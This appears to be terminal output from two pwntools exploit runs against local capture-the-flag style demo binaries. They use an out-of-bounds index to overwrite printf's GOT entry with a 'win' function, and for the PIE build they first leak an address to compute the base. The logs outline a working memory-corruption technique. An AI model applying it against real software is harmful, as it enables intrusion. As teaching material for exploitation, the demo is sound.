```
python3 pwn-oob-nopie.py BIN=./oob-nopie.bin
[+] Starting local process '/demos/oob-demo/oob-nopie.bin': pid 1141
[*] Overwriting GOT Entry with index: -9
[*] Paused (press any to continue)
[*] Win Func: 0x4011a9
[*] GOT[printf]=e.sym['win']
[*] Paused (press any to continue)

Which book would you like to read [0-3] <<< flag{i_sure_wished_this_worked_remotely_too}
>>> This book: UH\x89\xe5H\x8d\x05\xae\x0e is old. Replace it with a new book.
Name of New Book >>>flag{i_sure_wished_this_worked_remotely_too}
```

```
python3 pwn-oob-pie.py BIN=./oob-pie.bin
[+] Starting local process '/demos/oob-demo/oob-pie.bin': pid 1887
[*] Leaking Offset at index: -3
[*] Leak: 0x5584332ce048
[*] Leak (0x5584332ce048) - Offset(0x4048) = Base (0x5584332ca000)
[*] Base address: 0x5584332ca000
[*] Win Func: 0x5584332cb1f3
[*] Overwriting GOT Entry with index: -9
[*] GOT[printf]=e.sym['win']
[*] Paused (press any to continue)
[*] Switching to interactive mode
[*] Process '/demos/oob-demo/oob-pie.bin' stopped with exit code -11 (SIGSEGV) (pid 1887)

Which book would you like to read [0-3] <<< >>> This book: H\x81\xec\xd8 is old. Replace it with a new book.
Name of New Book >>>flag{i_sure_wished_this_worked_remotely_too}
[*] Got EOF while reading in interactive
```